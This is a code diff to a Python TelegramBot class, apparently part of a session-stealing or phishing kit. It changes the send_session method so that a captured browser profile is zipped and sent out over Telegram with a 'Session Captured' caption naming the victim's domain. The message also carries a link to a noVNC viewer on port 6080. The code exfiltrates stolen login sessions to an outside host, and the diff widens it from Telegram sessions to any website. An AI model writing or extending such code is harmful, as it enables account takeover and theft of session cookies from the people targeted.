@@ -81,8 +81,8 @@ class TelegramBot:
             traceback.print_exc()
             return False
     
-    def send_session(self, session_id: str, profile_path: str) -> bool:
-        """Send Telegram session zip"""
+    def send_session(self, session_id: str, profile_path: str, domain: str = "") -> bool:
+        """Send web session zip"""
         if session_id in self.sent:
             return False
         self.sent.add(session_id)
@@ -104,10 +104,10 @@ class TelegramBot:
                     if f.is_file():
                         zf.write(f, f.relative_to(profile_dir))
             
-            caption = "✅ <b>Session Captured</b>\n\nZip dumped"
+            caption = f"✅ <b>Session Captured</b>\n\n🌐 {domain}\n\nZip dumped"
             
-            domain = self.domain if self.domain != "localhost" else "127.0.0.1"
-            buttons = [[{"text": "🚀 View", "url": f"http://{domain}:6080/vnc.html"}]]
+            ip = self.domain if self.domain != "localhost" else "127.0.0.1"
+            buttons = [[{"text": "🚀 View", "url": f"http://{ip}:6080/vnc.html"}]]
             
             return self.send_file(zip_path, caption, buttons)
         finally:
